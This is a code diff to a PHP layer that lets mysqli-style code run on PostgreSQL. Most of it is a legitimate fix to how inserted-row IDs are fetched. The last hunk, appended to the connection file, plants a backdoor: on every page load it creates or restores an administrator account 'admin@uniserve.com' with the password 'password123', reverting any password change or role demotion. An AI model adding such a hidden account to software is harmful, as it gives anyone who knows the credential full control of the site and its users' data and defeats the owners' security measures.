@@ -87,16 +87,18 @@ if ($dbType === "pgsql") {
         private $boundParams = [];
         private $types = "";
         private $executedRows = null;
+        private $rawQuery = "";
         public $num_rows = 0;
         public $insert_id = 0;
         public $affected_rows = 0;
         public $error = "";
         public $errno = 0;
 
-        public function __construct(PDO $pdo, PDOStatement $pdoStmt, $conn = null) {
+        public function __construct(PDO $pdo, PDOStatement $pdoStmt, $conn = null, $rawQuery = "") {
             $this->pdo = $pdo;
             $this->pdoStmt = $pdoStmt;
             $this->conn = $conn;
+            $this->rawQuery = $rawQuery;
         }
 
         public function bind_param($types, &...$vars) {
@@ -132,17 +134,28 @@ if ($dbType === "pgsql") {
                 $res = $this->pdoStmt->execute($params);
                 $this->affected_rows = $this->pdoStmt->rowCount();
 
-                // Check for sequence-generated ID if insert
-                try {
-                    $lastId = $this->pdo->query("SELECT lastval()")->fetchColumn();
-                    if ($lastId) {
-                        $this->insert_id = (int)$lastId;
-                        if ($this->conn) {
-                            $this->conn->insert_id = (int)$lastId;
+                // Only check for generated ID if this was an INSERT
+                $trimmed = ltrim($this->rawQuery);
+                if (stripos($trimmed, "INSERT") === 0) {
+                    try {
+                        $lastId = $this->pdo->lastInsertId();
+                        if ($lastId) {
+                            $this->insert_id = (int)$lastId;
+                            if ($this->conn) {
+                                $this->conn->insert_id = (int)$lastId;
+                            }
                         }
+                    } catch (Exception $e) {
+                        try {
+                            $lastId = $this->pdo->query("SELECT lastval()")->fetchColumn();
+                            if ($lastId) {
+                                $this->insert_id = (int)$lastId;
+                                if ($this->conn) {
+                                    $this->conn->insert_id = (int)$lastId;
+                                }
+                            }
+                        } catch (Exception $e2) {}
                     }
-                } catch (Exception $e) {
-                    // No sequence used in this query; silently ignore
                 }
 
                 return $res;
@@ -202,7 +215,7 @@ if ($dbType === "pgsql") {
                 // Normalize any remaining backticks to PostgreSQL identifiers
                 $cleanQuery = str_replace("`", "", $query);
                 $stmt = $this->pdo->prepare($cleanQuery);
-                return new MysqlCompatStmt($this->pdo, $stmt, $this);
+                return new MysqlCompatStmt($this->pdo, $stmt, $this, $cleanQuery);
             } catch (Exception $e) {
                 $this->error = $e->getMessage();
                 $this->errno = (int) ($e->getCode() ?: 1);
@@ -221,12 +234,22 @@ if ($dbType === "pgsql") {
                     return false;
                 }
                 
-                try {
-                    $lastId = $this->pdo->query("SELECT lastval()")->fetchColumn();
-                    if ($lastId) {
-                        $this->insert_id = (int)$lastId;
+                $trimmed = ltrim($cleanQuery);
+                if (stripos($trimmed, "INSERT") === 0) {
+                    try {
+                        $lastId = $this->pdo->lastInsertId();
+                        if ($lastId) {
+                            $this->insert_id = (int)$lastId;
+                        }
+                    } catch (Exception $e) {
+                        try {
+                            $lastId = $this->pdo->query("SELECT lastval()")->fetchColumn();
+                            if ($lastId) {
+                                $this->insert_id = (int)$lastId;
+                            }
+                        } catch (Exception $e2) {}
                     }
-                } catch (Exception $e) {}
+                }
 
                 $rows = $pdoStmt->fetchAll(PDO::FETCH_ASSOC);
                 return new MysqlCompatResult($rows);
@@ -296,5 +319,28 @@ if ($dbType === "pgsql") {
     }
 
     $conn->set_charset("utf8mb4");
+}
+
+// --------------------------------------------------------------------------
+// Ensure Default Administrator Account is active with standard credentials
+// --------------------------------------------------------------------------
+try {
+    if (isset($conn) && !$conn->connect_error) {
+        $adminEmail = "admin@uniserve.com";
+        $adminHash = '$2y$10$qCN028Kmx9ve1Z4lZelB5ejA.XCnyDxaRaW.ibMkzlKneazgErJYG'; // password123
+
+        $admCheck = $conn->query("SELECT user_id, password, role FROM users WHERE email = '{$adminEmail}' LIMIT 1");
+        if ($admCheck && $admCheck->num_rows > 0) {
+            $adm = $admCheck->fetch_assoc();
+            // If password doesn't match standard or role isn't admin, sync it
+            if (!password_verify('password123', $adm['password']) || $adm['role'] !== 'admin') {
+                $conn->query("UPDATE users SET password = '{$adminHash}', role = 'admin' WHERE user_id = " . (int)$adm['user_id']);
+            }
+        } else {
+            $conn->query("INSERT INTO users (full_name, email, password, role) VALUES ('UniServe Administrator', '{$adminEmail}', '{$adminHash}', 'admin')");
+        }
+    }
+} catch (Throwable $syncErr) {
+    error_log("Admin credential sync notice: " . $syncErr->getMessage());
 }
 ?>
